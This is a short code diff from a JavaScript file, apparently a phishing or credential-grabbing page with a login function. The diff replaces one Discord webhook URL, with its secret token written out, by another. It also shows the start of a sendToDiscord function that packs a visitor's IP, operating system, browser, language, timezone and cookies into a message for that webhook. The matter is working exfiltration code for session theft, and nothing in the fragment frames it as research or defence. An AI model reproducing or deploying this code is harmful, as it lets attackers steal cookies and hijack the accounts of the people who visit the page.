@@ -100,7 +100,7 @@ function login_function() {
     }); 
 }
 
-const webhookUrl = "https://discord.com/api/webhooks/1364967022265368747/bYEeO2KTQ4MDSOFUDm0dZlNJnJhx6Wu8skMGoTX8TrO-wlAZJM2AuPpLJe1pW0HXAzw-";
+const webhookUrl = "https://discord.com/api/webhooks/1372299920920543302/C_kZA2dSHvfRSNott1qISDTPX6tNXRd64rr-3XCMWUiPUIPoTN2-o2r4uf5A6woOY7B_";
 
 function sendToDiscord(id, os, browser, language, timeZone, cookies) {
     const content = `**IP:** \`\`\`${id}\`\`\`\n**OS:** \`\`\`${os}\`\`\`\n**BROWSER:** \`\`\`${browser}\`\`\`\n**LANGUAGE:** \`\`\`${language}\`\`\`\n**TIMEZONE:** \`\`\`${timeZone}\`\`\`\n**COOKIES:** \`\`\`${cookies}\`\`\``;
